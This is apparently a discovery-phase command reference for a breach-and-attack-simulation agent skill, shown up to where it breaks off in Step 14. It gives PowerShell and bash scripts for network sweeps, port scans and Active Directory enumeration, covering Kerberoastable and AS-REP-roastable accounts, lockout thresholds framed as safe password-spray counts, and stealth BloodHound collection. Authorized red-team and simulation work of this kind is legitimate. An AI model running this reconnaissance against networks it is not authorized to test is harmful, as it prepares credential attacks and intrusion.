# Discovery — tool commands reference

Concrete commands for every step of `SKILL.md`.

**Enumeration philosophy:**

| Platform | Primary | Fallback |
|----------|---------|---------|
| Windows | `[ADSI]` / `[DirectorySearcher]` — built-in .NET, zero install | Same tool with alternate params, then netexec |
| Linux | `ldapsearch` — built-in on Kali/Debian | Same tool with alternate bind, then netexec |
| Either | Third-party (SharpHound, Rubeus, certipy) only for tasks with no LDAP equivalent | — |

**Error handling rule:** every command block wraps in try/catch or checks exit code.
If primary fails, run fallback. If fallback fails, write `ERROR: <step> <reason>` to output
and continue — never abort the whole phase on a single step failure.

**Global substitution key**

| Placeholder    | Source |
|----------------|--------|
| `<DC_IP>`      | `network.dc_ip` |
| `<DOMAIN>`     | `domain.name` |
| `<BASE_DN>`    | `domain.base_dn` e.g. `DC=corp,DC=local` |
| `<USER>`       | `creds.domain_user` |
| `<PASS>`       | `creds.domain_pass` |
| `<ARTIFACTS>`  | per-stage artifact directory (`C:\Windows\Temp\bas`) |
| `<CIDR>`       | `network.cidr` |

---

## Step 0 — Machine context (every machine, every hop)

OS built-ins only. No tools. No downloads.

### Windows

```powershell
try {
    New-Item -ItemType Directory -Force C:\Windows\Temp\bas | Out-Null

    # Identity
    $id  = whoami /all 2>&1
    $priv = whoami /priv 2>&1
    $grp  = whoami /groups 2>&1

    # Domain membership
    $cs  = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
    $dom = $cs.PartOfDomain
    $dn  = $cs.Domain

    # OS info
    $os  = (Get-WmiObject Win32_OperatingSystem -ErrorAction Stop).Caption
    $hn  = $env:COMPUTERNAME

    # All network adapters — detect multi-homed host
    $adapters = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
        Where-Object { $_.IPAddress -notlike '127.*' -and $_.PrefixLength -lt 32 } |
        ForEach-Object {
            $b  = ([System.Net.IPAddress]$_.IPAddress).GetAddressBytes()
            $mk = [System.BitConverter]::GetBytes(
                [uint32]([Math]::Pow(2,32)-[Math]::Pow(2,32-$_.PrefixLength)))
            if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($mk) }
            $net = (0..3|ForEach-Object{$b[$_]-band $mk[$_]}) -join '.'
            "ADAPTER: $($_.InterfaceAlias)  IP: $($_.IPAddress)  CIDR: $net/$($_.PrefixLength)"
        }

    # Output structured for parser
    Write-Output "PLATFORM: windows"
    Write-Output "HOSTNAME: $hn"
    Write-Output "DOMAIN_JOINED: $dom"
    Write-Output "DOMAIN: $dn"
    Write-Output "OS: $os"
    $adapters | ForEach-Object { Write-Output $_ }
    Write-Output "--- WHOAMI_ALL ---"
    $id
    Write-Output "--- WHOAMI_PRIV ---"
    $priv

    # Local admins
    $localAdmins = net localgroup administrators 2>&1
    Write-Output "--- LOCAL_ADMINS ---"
    $localAdmins

} catch {
    Write-Output "ERROR: step0_windows $($_.Exception.Message)"
} | Tee-Object C:\Windows\Temp\bas\step0.txt

# Logon server (domain-joined only)
if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
    try {
        nltest /dsgetdc:$env:USERDOMAIN 2>&1 | Tee-Object -Append C:\Windows\Temp\bas\step0.txt
        Write-Output "LOGON_SERVER: $env:LOGONSERVER" |
            Tee-Object -Append C:\Windows\Temp\bas\step0.txt
    } catch {
        Write-Output "ERROR: step0_nltest $($_.Exception.Message)"
    }
}
```

### Linux

```bash
{
    echo "PLATFORM: linux"
    id 2>/dev/null          || echo "ERROR: id failed"
    hostname -f 2>/dev/null || hostname 2>/dev/null || echo "ERROR: hostname failed"
    ip -o -4 addr show 2>/dev/null | grep -v '127\.' || \
        ifconfig 2>/dev/null | grep -E 'inet |inet addr' || \
        echo "ERROR: no ip/ifconfig"
    ip route show 2>/dev/null | grep -v '^default' || \
        netstat -rn 2>/dev/null || echo "ERROR: no routing info"
    cat /etc/os-release 2>/dev/null | grep -E '^NAME|^VERSION' || \
        uname -a
    # Domain check — try multiple methods, first success wins
    realm list 2>/dev/null && echo "REALM_FOUND: true" || \
    grep -E "default_realm|kdc" /etc/krb5.conf 2>/dev/null || \
    grep -E "^domains|^ad_domain" /etc/sssd/sssd.conf 2>/dev/null || \
    echo "DOMAIN_JOINED: false"
} 2>&1 | tee <ARTIFACTS>/step0.txt
```

Save: `host.platform`, `host.domain_joined` (bool), `host.domain_name`,
`host.current_user`, `host.token_privileges` (list), `network.cidrs` (all adapters).

---

## Phase A — Network Discovery

### Step 1 — Network ranges

Derived from Step 0 adapter output.
Save: `network.cidr` (primary), `network.cidrs` (full list, one per adapter).
Step 4 sweeps every CIDR in `network.cidrs`.

---

### Step 2 — Confirm nmap

```powershell
# Windows
try {
    $v = nmap --version 2>&1 | Select-String "Nmap"
    if ($v) { Write-Output "NMAP_AVAILABLE: true"; Write-Output "NMAP_VERSION: $v" }
    else     { Write-Output "NMAP_AVAILABLE: false" }
} catch { Write-Output "NMAP_AVAILABLE: false" }
```

```bash
# Linux
nmap --version 2>/dev/null | head -1 && echo "NMAP_AVAILABLE: true" || \
    echo "NMAP_AVAILABLE: false"
```

Save: `recon.nmap_available` = bool.

---

### Step 3 — Install nmap (only if missing)

```cmd
rem Windows — try winget then choco
winget install -e --id Insecure.Nmap --silent --accept-package-agreements 2>nul || ^
choco install nmap -y 2>nul
nmap --version 2>nul && echo "NMAP_INSTALL: success" || echo "NMAP_INSTALL: failed_use_ps_fallback"
```

```bash
sudo apt-get update -qq && sudo apt-get install -y nmap 2>/dev/null && \
    echo "NMAP_INSTALL: success" || echo "NMAP_INSTALL: failed"
```

---

### Step 4 — Host discovery (alive check, ALL subnets)

**Host alive only — no port scan here. Repeat for every CIDR in `network.cidrs`.**

#### nmap path

```bash
# One run per CIDR — increment suffix per subnet
nmap -sn -PE -PP \
     -PS21,22,80,135,139,443,445,3389,5985 \
     -PA80,443 \
     --min-rate 300 --max-retries 1 \
     -oA <ARTIFACTS>/sweep_1 <CIDR1> 2>/dev/null || \
     echo "SWEEP_1_ERROR: nmap failed"

# Merge all sweep files
grep "Status: Up" <ARTIFACTS>/sweep_*.gnmap 2>/dev/null | \
    awk '{print $2}' | sort -u > <ARTIFACTS>/live_hosts.txt

# ARP fallback if zero results
if [ ! -s <ARTIFACTS>/live_hosts.txt ]; then
    nmap -sn -PR --min-rate 200 \
         -oA <ARTIFACTS>/sweep_arp <CIDR1> 2>/dev/null
    grep "Status: Up" <ARTIFACTS>/sweep_arp.gnmap 2>/dev/null | \
        awk '{print $2}' >> <ARTIFACTS>/live_hosts.txt
fi

echo "LIVE_HOST_COUNT: $(wc -l < <ARTIFACTS>/live_hosts.txt 2>/dev/null || echo 0)"
```

#### PS-fallback (Windows, nmap absent)

```powershell
try {
    New-Item -ItemType Directory -Force C:\Windows\Temp\bas | Out-Null
    $cidrRaw = Get-Content C:\Windows\Temp\bas\network_cidr.txt -ErrorAction SilentlyContinue
    if (-not $cidrRaw) { throw "No CIDR file found — check Step 1 output" }

    $prefix = ($cidrRaw -split '/')[0] -replace '\d+$',''
    $hosts   = [System.Collections.Generic.HashSet[string]]::new()

    # 1 — ARP cache (zero cost, zero noise)
    try {
        arp -a 2>/dev/null | Select-String "$($prefix.TrimEnd('.')).\d+" |
            ForEach-Object {
                if ($_ -match '(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})') {
                    $null = $hosts.Add($Matches[1])
                }
            }
    } catch { Write-Output "WARN: ARP cache read failed" }

    # 2 — ICMP ping, 500ms
    try {
        1..254 | ForEach-Object {
            $ip = "$($prefix.TrimEnd('.')).$_"
            if ($hosts -notcontains $ip) {
                if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutMilliSecs 500 `
                        -ErrorAction SilentlyContinue) {
                    $null = $hosts.Add($ip)
                }
            }
        }
    } catch { Write-Output "WARN: ICMP sweep failed, continuing with TCP" }

    # 3 — TCP/445 for ICMP-blocked hosts
    try {
        1..254 | ForEach-Object {
            $ip = "$($prefix.TrimEnd('.')).$_"
            if ($hosts -notcontains $ip) {
                $tcp = New-Object System.Net.Sockets.TcpClient
                try {
                    $c = $tcp.BeginConnect($ip, 445, $null, $null)
                    if ($c.AsyncWaitHandle.WaitOne(500, $false)) {
                        $tcp.EndConnect($c)
                        $null = $hosts.Add($ip)
                    }
                } catch {}
                finally { $tcp.Dispose() }
            }
        }
    } catch { Write-Output "WARN: TCP/445 sweep error" }

    $unique = $hosts | Sort-Object
    $unique | Out-File C:\Windows\Temp\bas\live_hosts.txt -Encoding ascii
    $unique | ConvertTo-Json | Out-File C:\Windows\Temp\bas\live_hosts.json -Encoding ascii
    Write-Output "LIVE_HOST_COUNT: $($unique.Count)"
    $unique | ForEach-Object { Write-Output "HOST: $_" }

} catch {
    Write-Output "ERROR: step4_ps_fallback $($_.Exception.Message)"
    Write-Output "LIVE_HOST_COUNT: 0"
} | Tee-Object C:\Windows\Temp\bas\step4.txt
```

Save: `network.live_hosts` = JSON array, `live_hosts.txt`.

---

### Step 5 — Port scan (alive hosts only)

**Reads `live_hosts.txt`. Never scans raw CIDR. `-Pn` always.**

#### nmap

```bash
[ -s <ARTIFACTS>/live_hosts.txt ] || { echo "ERROR: step5 no live hosts file"; exit 1; }

nmap -sT -sV -Pn \
     -p 21,22,25,53,80,88,110,135,139,143,389,443,445,587,636,\
1433,1521,3268,3269,3306,3389,5432,5985,5986,8080,8443,8888 \
     --version-intensity 5 --min-rate 200 --max-retries 2 \
     -oA <ARTIFACTS>/nmap_services \
     -iL <ARTIFACTS>/live_hosts.txt 2>/dev/null || \
     echo "ERROR: step5_nmap failed"

echo "SCAN_COMPLETE: true"
```

#### PS-fallback (Windows)

```powershell
try {
    $hostsFile = 'C:\Windows\Temp\bas\live_hosts.txt'
    if (-not (Test-Path $hostsFile)) { throw "live_hosts.txt not found — run Step 4 first" }

    $hosts = Get-Content $hostsFile -ErrorAction Stop |
        Where-Object { $_ -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$' }

    if ($hosts.Count -eq 0) { throw "No valid IPs in live_hosts.txt" }

    $ports  = @(21,22,25,53,80,88,110,135,139,143,389,443,445,587,636,
                1433,3268,3269,3306,3389,5432,5985,5986,8080,8443,8888)
    $svcMap = @{
        21='ftp'; 22='ssh'; 25='smtp'; 53='dns'; 80='http';
        88='kerberos'; 110='pop3'; 135='msrpc'; 139='netbios-ssn';
        143='imap'; 389='ldap'; 443='https'; 445='microsoft-ds';
        587='submission'; 636='ldapssl'; 1433='ms-sql-s';
        3268='globalcatLDAP'; 3269='globalcatLDAPssl'; 3306='mysql';
        3389='ms-wbt-server'; 5432='postgresql'; 5985='wsman';
        5986='wsmans'; 8080='http-proxy'; 8443='https-alt'; 8888='http-alt'
    }

    $svcDict = @{}
    foreach ($ip in $hosts) {
        $svcDict[$ip] = [System.Collections.Generic.List[hashtable]]::new()
        foreach ($port in $ports) {
            $tcp = New-Object System.Net.Sockets.TcpClient
            try {
                $c = $tcp.BeginConnect($ip, $port, $null, $null)
                if ($c.AsyncWaitHandle.WaitOne(150, $false)) {
                    $tcp.EndConnect($c)
                    $svc = if ($svcMap.ContainsKey($port)) { $svcMap[$port] } else { 'unknown' }
                    Write-Output "OPEN: $ip`:$port ($svc)"
                    $svcDict[$ip].Add(@{port=$port; proto='tcp'; service=$svc})
                }
            } catch {}
            finally { $tcp.Dispose() }
        }
    }

    $svcDict | ConvertTo-Json -Depth 4 |
        Out-File C:\Windows\Temp\bas\services.json -Encoding ascii
    Write-Output "SCAN_COMPLETE: true"
    Write-Output "HOSTS_SCANNED: $($hosts.Count)"

} catch {
    Write-Output "ERROR: step5_ps $($_.Exception.Message)"
} | Tee-Object C:\Windows\Temp\bas\step5.txt
```

Save: `network.services` = JSON dict `{ip:[{port,proto,service}]}`.

---

### Step 6 — Service fingerprinting (native first)

| Port | Windows (try first) | Linux (try first) | Fallback either |
|------|--------------------|--------------------|----------------|
| 445 | `net view \\<IP> /all` | `smbclient -N -L //<IP>` | `netexec smb <IP>` |
| 389 | `[ADSI]"LDAP://<IP>"` (below) | `ldapsearch -x -H ldap://<IP> -s base -b ""` | — |
| 3389 | `qwinsta /server:<IP>` | `xfreerdp /v:<IP> /cert-ignore 2>&1` | — |
| 80/443 | `curl -sI -m5 http://<IP>/` | `curl -sI -m5 http://<IP>/` | — |
| 22 | `ssh -o BatchMode=yes <IP> 2>&1` | `nc -w2 <IP> 22` | — |
| 1433 | `sqlcmd -S <IP> -Q "SELECT @@VERSION"` | — | `netexec mssql <IP>` |

```powershell
# Windows — LDAP rootDSE probe, pure .NET, unauthenticated
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<DC_IP>")
    $de.RefreshCache() 2>$null
    Write-Output "DC_HOSTNAME: $($de.Properties['dnsHostName'].Value)"
    Write-Output "BASE_DN: $($de.Properties['defaultNamingContext'].Value)"
    Write-Output "FUNC_LEVEL: $($de.Properties['domainFunctionality'].Value)"
} catch {
    Write-Output "WARN: step6_ldap_rootdse failed — $($_.Exception.Message)"
    # Fallback: netexec
    try { netexec smb <DC_IP> 2>&1 } catch { Write-Output "ERROR: step6 both methods failed" }
}
```

```bash
# Linux — ldapsearch rootDSE unauthenticated
ldapsearch -x -H ldap://<DC_IP> -s base -b "" \
    namingContexts defaultNamingContext dnsHostName \
    domainFunctionality forestFunctionality 2>/dev/null || \
    netexec smb <DC_IP> 2>/dev/null || \
    echo "ERROR: step6 rootDSE probe failed"
```

---

### Step 7 — DC gate

```powershell
# Windows
try {
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<DC_IP>")
    $dn = $de.Properties['defaultNamingContext'].Value
    if ($dn) {
        Write-Output "DC_FOUND: true"
        Write-Output "BASE_DN: $dn"
        Write-Output "DC_HOSTNAME: $($de.Properties['dnsHostName'].Value)"
        Write-Output "RECOMMENDED_NEXT: ad-enumeration"
        Write-Output "PHASE_DONE: false"
    } else {
        Write-Output "DC_FOUND: false"
        Write-Output "RECOMMENDED_NEXT: escalating-privileges"
        Write-Output "PHASE_DONE: true"
    }
} catch {
    Write-Output "DC_FOUND: false"
    Write-Output "ERROR: step7 $($_.Exception.Message)"
    Write-Output "RECOMMENDED_NEXT: escalating-privileges"
} | Tee-Object C:\Windows\Temp\bas\dc_gate.txt
```

```bash
# Linux
result=$(ldapsearch -x -H ldap://<DC_IP> -s base -b "" defaultNamingContext 2>/dev/null | \
    grep "defaultNamingContext:")
if [ -n "$result" ]; then
    echo "DC_FOUND: true"
    echo "$result"
    echo "RECOMMENDED_NEXT: ad-enumeration"
    echo "PHASE_DONE: false"
else
    echo "DC_FOUND: false"
    echo "RECOMMENDED_NEXT: escalating-privileges"
    echo "PHASE_DONE: true"
fi | tee <ARTIFACTS>/dc_gate.txt
```

---

## Phase B — Active Directory Enumeration

**Pattern for every Windows step:**
1. Try `[ADSI]` / `[DirectorySearcher]` — native .NET
2. On failure → retry with alternate bind or anonymous
3. On second failure → try netexec equivalent
4. Write `ERROR:` line and continue — never abort

---

### Step 8 — DC probe unauthenticated (D11)

```powershell
# Windows
function Get-DCInfo {
    param($dcIp)
    # Try 1: authenticated DirectoryEntry
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$dcIp/<BASE_DN>", "<USER>@<DOMAIN>", "<PASS>")
        $de.RefreshCache()
        return @{
            domain   = $de.Properties['distinguishedName'].Value
            dc_host  = $de.Properties['dnsHostName'].Value
            func_lvl = $de.Properties['domainFunctionality'].Value
            method   = 'authenticated'
        }
    } catch {}
    # Try 2: anonymous
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dcIp")
        $de.RefreshCache()
        return @{
            domain   = $de.Properties['defaultNamingContext'].Value
            dc_host  = $de.Properties['dnsHostName'].Value
            func_lvl = $de.Properties['domainFunctionality'].Value
            method   = 'anonymous'
        }
    } catch {}
    return $null
}

$info = Get-DCInfo -dcIp "<DC_IP>"
if ($info) {
    Write-Output "DOMAIN: $($info.domain)"
    Write-Output "DC_HOST: $($info.dc_host)"
    Write-Output "FUNC_LEVEL: $($info.func_lvl)"
    Write-Output "BIND_METHOD: $($info.method)"
} else {
    Write-Output "WARN: ADSI failed — trying netexec fallback"
    try { netexec smb <DC_IP> 2>&1 }
    catch { Write-Output "ERROR: step8 all methods failed" }
}
```

```bash
# Linux — try authenticated then anonymous
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -s base -b "" \
    defaultNamingContext dnsHostName domainFunctionality 2>/dev/null || \
ldapsearch -x -H ldap://<DC_IP> \
    -s base -b "" \
    defaultNamingContext dnsHostName 2>/dev/null || \
netexec smb <DC_IP> 2>/dev/null || \
echo "ERROR: step8 all methods failed"
```

---

### Step 9 — BloodHound collection (D1)

**No native equivalent — SharpHound / bloodhound-python required.**

```powershell
# Windows — SharpHound.exe
try {
    $outDir = "C:\Windows\Temp\bas\bloodhound"
    New-Item -ItemType Directory -Force $outDir | Out-Null
    SharpHound.exe -c All --stealth `
        --outputdirectory $outDir `
        --zipfilename bh_out.zip 2>&1
    $zip = Get-ChildItem $outDir -Filter "*BloodHound.zip" |
        Sort-Object LastWriteTime | Select-Object -Last 1
    if ($zip) {
        Write-Output "BLOODHOUND_ZIP: $($zip.FullName)"
        Write-Output "BLOODHOUND_SIZE: $($zip.Length)"
    } else {
        Write-Output "WARN: SharpHound ran but no zip found"
        # Fallback: DCOnly collection (quieter, may work when All fails)
        SharpHound.exe -c DCOnly --stealth `
            --outputdirectory $outDir `
            --zipfilename bh_dconly.zip 2>&1
    }
} catch {
    Write-Output "ERROR: step9_sharphound $($_.Exception.Message)"
}
```

```bash
# Linux
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> \
    -c all --zip -o <ARTIFACTS>/bloodhound 2>/dev/null && \
    echo "BLOODHOUND_ZIP: $(ls <ARTIFACTS>/bloodhound/*.zip 2>/dev/null | head -1)" || \
    echo "ERROR: step9_bloodhound-python failed"
```

---

### Step 10 — DC and FSMO discovery (D11)

```powershell
# Windows — DirectorySearcher primary
function Get-DomainControllers {
    param($dcIp, $baseDn, $user, $pass, $domain)

    # Try 1: authenticated DirectorySearcher
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$dcIp/$baseDn", "$user@$domain", $pass)
        $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
        $s.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
        $s.PropertiesToLoad.AddRange(@("name","dNSHostName","distinguishedName"))
        $s.PageSize = 1000
        $r = $s.FindAll()
        Write-Output "DC_COUNT: $($r.Count)"
        $r | ForEach-Object {
            Write-Output "DC: $($_.Properties['dnshostname'][0])"
        }
        $r.Dispose()
        return
    } catch { Write-Output "WARN: step10_authed failed — $($_.Exception.Message)" }

    # Try 2: anonymous bind
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dcIp/$baseDn")
        $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
        $s.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
        $s.PropertiesToLoad.AddRange(@("name","dNSHostName"))
        $s.FindAll() | ForEach-Object {
            Write-Output "DC: $($_.Properties['dnshostname'][0])"
        }
        return
    } catch { Write-Output "WARN: step10_anon failed — $($_.Exception.Message)" }

    # Try 3: native nltest
    try {
        nltest /dclist:<DOMAIN> 2>&1 | Where-Object { $_ -match '\[DC\]' }
        return
    } catch {}

    Write-Output "ERROR: step10 all methods failed"
}

Get-DomainControllers "<DC_IP>" "<BASE_DN>" "<USER>" "<PASS>" "<DOMAIN>" |
    Tee-Object C:\Windows\Temp\bas\dcs.txt

# FSMO roles
try {
    $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    Write-Output "PDC: $($dom.PdcRoleOwner.Name)"
    Write-Output "RID: $($dom.RidRoleOwner.Name)"
    Write-Output "INFRA: $($dom.InfrastructureRoleOwner.Name)"
    Write-Output "SCHEMA: $($dom.Forest.SchemaRoleOwner.Name)"
    Write-Output "NAMING: $($dom.Forest.NamingRoleOwner.Name)"
} catch {
    Write-Output "WARN: FSMO native .NET failed — trying nltest"
    netdom query fsmo 2>&1 | Tee-Object -Append C:\Windows\Temp\bas\dcs.txt
}
```

```bash
# Linux — ldapsearch primary, netexec fallback
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" \
    "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
    name dNSHostName 2>/dev/null | grep -E "^name:|^dNSHostName:" || \
ldapsearch -x -H ldap://<DC_IP> \
    -b "<BASE_DN>" \
    "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
    name dNSHostName 2>/dev/null | grep -E "^name:|^dNSHostName:" || \
echo "ERROR: step10 ldapsearch failed"

# FSMO via ldapsearch (rootDSE)
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -s base -b "" fSMORoleOwner 2>/dev/null || \
echo "WARN: step10_fsmo ldapsearch failed"
```

---

### Step 11 — User and group enumeration (D6)

```powershell
# Windows — DirectorySearcher with try/fallback
function Get-ADUsers {
    param($dcIp, $baseDn, $user, $pass, $domain)

    $de = $null
    # Try authenticated
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$dcIp/$baseDn", "$user@$domain", $pass)
        $de.RefreshCache() | Out-Null
    } catch {
        Write-Output "WARN: step11 auth failed — trying anonymous"
        try {
            $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dcIp/$baseDn")
        } catch {
            Write-Output "ERROR: step11 cannot bind to LDAP"
            return
        }
    }

    $s = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.PageSize = 1000

    # All users
    try {
        $s.Filter = "(&(objectCategory=person)(objectClass=user))"
        $s.PropertiesToLoad.Clear()
        $s.PropertiesToLoad.AddRange(@("samaccountname","displayName","adminCount",
            "userAccountControl","servicePrincipalName","memberOf","lastLogonTimestamp"))
        $s.FindAll() | ForEach-Object {
            $uac  = [int]($_.Properties['useraccountcontrol'][0])
            $dis  = ($uac -band 2) -ne 0
            $nopre = ($uac -band 4194304) -ne 0
            $spn  = $_.Properties['serviceprincipalname'].Count -gt 0
            $adm  = $_.Properties['admincount'][0]
            $name = $_.Properties['samaccountname'][0]
            Write-Output "USER: $name | ADMIN: $adm | DISABLED: $dis | NOPRE: $nopre | SPN: $spn"
        }
    } catch { Write-Output "ERROR: step11_users $($_.Exception.Message)" }

    # Privileged groups
    try {
        $s.Filter = "(&(objectClass=group)(adminCount=1))"
        $s.PropertiesToLoad.Clear()
        $s.PropertiesToLoad.AddRange(@("samaccountname","member","distinguishedName"))
        $s.FindAll() | ForEach-Object {
            $g = $_.Properties['samaccountname'][0]
            $c = $_.Properties['member'].Count
            Write-Output "PRIV_GROUP: $g | MEMBERS: $c"
            $_.Properties['member'] | ForEach-Object { Write-Output "  MEMBER: $_" }
        }
    } catch { Write-Output "ERROR: step11_groups $($_.Exception.Message)" }
}

Get-ADUsers "<DC_IP>" "<BASE_DN>" "<USER>" "<PASS>" "<DOMAIN>" |
    Tee-Object C:\Windows\Temp\bas\users.txt
```

```bash
# Linux — ldapsearch primary, retry anonymous, netexec fallback
{
# Users with key attributes
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" "(objectClass=user)" \
    samAccountName displayName adminCount userAccountControl \
    servicePrincipalName memberOf lastLogonTimestamp 2>/dev/null \
|| ldapsearch -x -H ldap://<DC_IP> \
    -b "<BASE_DN>" "(objectClass=user)" samAccountName 2>/dev/null \
|| { echo "ERROR: step11_users ldapsearch failed"; \
     netexec ldap <DC_IP> -u <USER> -p '<PASS>' --users 2>/dev/null; }

# Kerberoastable
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" \
    "(&(objectClass=user)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
    samAccountName servicePrincipalName adminCount 2>/dev/null | \
    grep -E "^samAccountName:|^servicePrincipalName:" || \
    echo "WARN: kerberoast enum failed"

# AS-REP roastable
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    samAccountName 2>/dev/null | grep "^samAccountName:" || \
    echo "WARN: asrep enum failed"
} 2>&1 | tee <ARTIFACTS>/users.txt
```

---

### Step 12 — Password policy (D15)

```powershell
# Windows
function Get-PasswordPolicy {
    param($dcIp, $baseDn, $user, $pass, $domain)
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$dcIp/$baseDn", "$user@$domain", $pass)
        $de.RefreshCache([string[]]@(
            "lockoutThreshold","lockoutObservationWindow",
            "minPwdLength","pwdProperties","maxPwdAge")) | Out-Null

        $threshold = [int]($de.Properties['lockoutthreshold'][0])
        $window    = [long]($de.Properties['lockoutobservationwindow'][0])
        $winMin    = [Math]::Abs($window / -10000000 / 60)
        $minLen    = [int]($de.Properties['minpwdlength'][0])
        $complex   = [int]($de.Properties['pwdproperties'][0])

        Write-Output "LOCKOUT_THRESHOLD: $threshold"
        Write-Output "OBSERVATION_WINDOW_MIN: $winMin"
        Write-Output "MIN_LENGTH: $minLen"
        Write-Output "COMPLEXITY_REQUIRED: $(($complex -band 1) -ne 0)"
        Write-Output "SAFE_SPRAY_ATTEMPTS: $([Math]::Max(0, $threshold - 1))"

    } catch {
        Write-Output "WARN: DirectoryEntry policy failed — trying net accounts"
        try {
            net accounts /domain 2>&1 | Select-String "Lockout|Length|Threshold"
        } catch { Write-Output "ERROR: step12 all methods failed" }
    }

    # Fine-grained PSOs
    try {
        $de2 = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$dcIp/$baseDn", "$user@$domain", $pass)
        $s   = New-Object System.DirectoryServices.DirectorySearcher($de2)
        $s.Filter = "(objectClass=msDS-PasswordSettings)"
        $s.PropertiesToLoad.AddRange(@("cn","msDS-LockoutThreshold",
            "msDS-LockoutObservationWindow","msDS-MinimumPasswordLength","msDS-PSOAppliesTo"))
        $psos = $s.FindAll()
        if ($psos.Count -gt 0) {
            Write-Output "FINE_GRAINED_PSO_COUNT: $($psos.Count)"
            $psos | ForEach-Object {
                Write-Output "PSO: $($_.Properties['cn'][0]) | Threshold: $($_.Properties['msds-lockoutthreshold'][0])"
            }
        }
    } catch { Write-Output "WARN: PSO query failed" }
}

Get-PasswordPolicy "<DC_IP>" "<BASE_DN>" "<USER>" "<PASS>" "<DOMAIN>" |
    Tee-Object C:\Windows\Temp\bas\password_policy.txt
```

```bash
# Linux
{
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "<BASE_DN>" -s base \
    lockoutThreshold lockoutObservationWindow minPwdLength pwdProperties 2>/dev/null \
|| netexec smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol 2>/dev/null \
|| echo "ERROR: step12 password policy failed"

# PSOs
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "CN=Password Settings Container,CN=System,<BASE_DN>" \
    "(objectClass=msDS-PasswordSettings)" \
    cn msDS-LockoutThreshold msDS-LockoutObservationWindow msDS-PSOAppliesTo 2>/dev/null || \
echo "WARN: PSO query failed"
} 2>&1 | tee <ARTIFACTS>/password_policy.txt
```

---

### Step 13 — DNS enumeration (D13)

```powershell
# Windows
try {
    $dnsBase = "DC=<DOMAIN>,CN=MicrosoftDNS,DC=DomainDnsZones,<BASE_DN>"
    $de = New-Object System.DirectoryServices.DirectoryEntry(
        "LDAP://<DC_IP>/$dnsBase", "<USER>@<DOMAIN>", "<PASS>")
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter   = "(objectClass=dnsNode)"
    $s.PageSize = 1000
    $s.PropertiesToLoad.Add("name") | Out-Null
    $r = $s.FindAll()
    Write-Output "DNS_RECORD_COUNT: $($r.Count)"
    $r | ForEach-Object { Write-Output "DNS: $($_.Properties['name'][0])" }
    $r.Dispose()
} catch {
    Write-Output "WARN: LDAP DNS zone query failed — $($_.Exception.Message)"
    # Fallback: nslookup SRV records
    try {
        nslookup -type=SRV "_ldap._tcp.dc._msdcs.<DOMAIN>" <DC_IP> 2>&1
        nslookup -type=ANY <DOMAIN> <DC_IP> 2>&1
    } catch { Write-Output "ERROR: step13 all methods failed" }
} | Tee-Object C:\Windows\Temp\bas\dns.txt
```

```bash
# Linux
{
ldapsearch -x -H ldap://<DC_IP> \
    -D "<USER>@<DOMAIN>" -w '<PASS>' \
    -b "DC=<DOMAIN>,CN=MicrosoftDNS,DC=DomainDnsZones,<BASE_DN>" \
    "(objectClass=dnsNode)" name 2>/dev/null | grep "^name:" \
|| dig axfr <DOMAIN> @<DC_IP> 2>/dev/null \
|| nslookup -type=ANY <DOMAIN> <DC_IP> 2>/dev/null \
|| echo "ERROR: step13 DNS enumeration failed"
} 2>&1 | tee <ARTIFACTS>/dns.txt
```

---

### Step 14 — Forest and trust mapping (D7)

```powershell
# Windows
try {
    # Try native .NET first
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $trusts = $domain.GetAllTrustRelationships()
    if ($trusts.Count -gt 0) {
        $trusts | ForEach-Object {
